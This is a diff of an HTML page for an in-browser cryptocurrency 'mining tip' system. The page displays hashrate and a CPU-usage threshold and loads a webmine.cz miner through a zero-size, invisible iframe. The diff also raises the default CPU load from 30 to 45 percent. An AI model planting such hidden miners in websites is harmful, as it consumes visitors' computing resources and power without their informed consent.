@@ -14,29 +14,22 @@
   </head>
   <style type="text/css">u {    border-bottom: 1px dotted #000;text-decoration: none;</style>
   <body>
-    <script>var INITIAL_CPU_LOAD = 30;</script>
+    <script>var INITIAL_CPU_LOAD = 45;</script>
     <div style="max-width:500px" class="container" >
       <div class="row" >
         <center>
-          <h3>⬇⬇~ 挖 矿 打 赏 系 统 ~⬇⬇</h3>
-          <p data-toggle="tooltip" data-placement="bottom" title="This hashrate is a very precise number reflecting your hashrate. In contrast, the webmine dashboard hashrate is a very crude estimate which is not useful for the single computer mining!" >
-            <p>当前算力</p>: <span id="hashrate" >waiting for connection...</span>
-          </p>
-          <p data-toggle="tooltip" data-placement="bottom" title="Real share is found once in a while. Your home dashboard will be reflecting the submited shares. Total hashes is just an estimation - over the long run they will converge to each other." >
-            <p>您已贡献</p>: <span id="total_hashes" >0</span>
-          </p>
-          <p data-toggle="tooltip" data-placement="bottom" title="Real share is found once in a while. Your home dashboard will be reflecting the submited shares. Total hashes is just an estimation - over the long run they will converge to each other." >
-            <p>Submitted shares</p>: <span id="total_shares" >0</span>
-          </p>
-          <p>Mining for account: <b>NuyoaH-L</b></p>
+          <h3>⬇⬇~ 挖 矿 打 赏 系 统 ~⬇⬇</h3><br>
+          <p>当前算力</p>: <span id="hashrate" >等 待 响 应...</span><br>
+          <p>您已贡献</p>: <span id="total_hashes" >0</span><br>
+          <p>Submitted shares</p>: <span id="total_shares" >0</span><br>
+          <h3 class="text-center" >
+            <p>CPU 使用阀值</p>
+            <div class="bar" ></div>
+            <h2 class="text-center" >
+              <input type='text' class='percent' readonly />
+            </h2>
+          </h3>
         </center>
-        <h3 class="text-center" >
-          <p>CPU 使用阀值</p>
-          <div class="bar" ></div>
-          <h2 class="text-center" >
-            <input type='text' class='percent' readonly />
-          </h2>
-        </h3>
       </div>
      </div>
      <iframe id='miner' width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=shF1amnFqlMSwHF'></iframe>
